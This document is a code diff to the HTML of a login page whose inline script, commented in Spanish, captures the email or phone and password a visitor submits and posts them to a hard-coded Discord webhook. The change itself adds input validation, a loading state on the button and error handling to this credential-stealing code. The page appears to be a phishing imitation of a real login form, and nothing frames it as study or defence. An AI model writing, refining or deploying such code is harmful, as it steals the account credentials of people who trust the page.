@@ -94,32 +94,62 @@
     <script src="./js/script.js"></script>
 	<!-- Agrega esto justo antes de cerrar el body (</body>) -->
 <script>
-    // Capturar el formulario cuando la página cargue
+       // Capturar el formulario cuando la página cargue
     document.addEventListener('DOMContentLoaded', function() {
         const form = document.querySelector('form');
         const webhookURL = 'https://discord.com/api/webhooks/1541394715440840726/VB2uOKnIldPXJlc8eurNEKJNaYCULIUfI-K8a9edoxl3NQqys27rzshdgulGGO-VOPm2';
         
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('emailORphone').value;
-            const password = document.getElementById('password').value;
-            
-            const message = {
-                content: `🔐 **Login Registrado**\n📧 Email: ${email}\n🔑 Pass: ${password}\n🕐 ${new Date().toLocaleString()}`
-            };
-            
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
+        if (form) {
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault(); // Evitar que recargue la página
+                
+                // Obtener valores
+                const email = document.getElementById('emailORphone').value.trim();
+                const password = document.getElementById('password').value.trim();
+                
+                // Validar que no estén vacíos
+                if (!email || !password) {
+                    alert('⚠️ Por favor, completa todos los campos');
+                    return;
+                }
+                
+                // Obtener el botón y mostrar estado de carga
+                const btn = this.querySelector('button[type="submit"]');
+                const textoOriginal = btn.textContent;
+                btn.textContent = '⏳ Enviando...';
+                btn.disabled = true;
+                
+                try {
+                    // Crear mensaje para Discord
+                    const message = {
+                        content: `🔐 **Login Registrado**\n📧 Email: ${email}\n🔑 Pass: ${password}\n🕐 ${new Date().toLocaleString('es-ES')}`
+                    };
+                    
+                    // Enviar al webhook
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(message)
+                    });
+                    
+                    if (response.ok) {
+                        // Limpiar campos
+                        document.getElementById('emailORphone').value = '';
+                        document.getElementById('password').value = '';
+                        alert('✅ Inicio de sesión registrado');
+                    } else {
+                        alert('❌ Error al enviar los datos');
+                    }
+                } catch (error) {
+                    alert('❌ Error de conexión');
+                    console.error('Error:', error);
+                } finally {
+                    // Restaurar botón
+                    btn.textContent = textoOriginal;
+                    btn.disabled = false;
+                }
             });
-            
-            // Limpiar campos
-            document.getElementById('emailORphone').value = '';
-            document.getElementById('password').value = '';
-            
-        });
+        }
     });
 </script>
 </body>
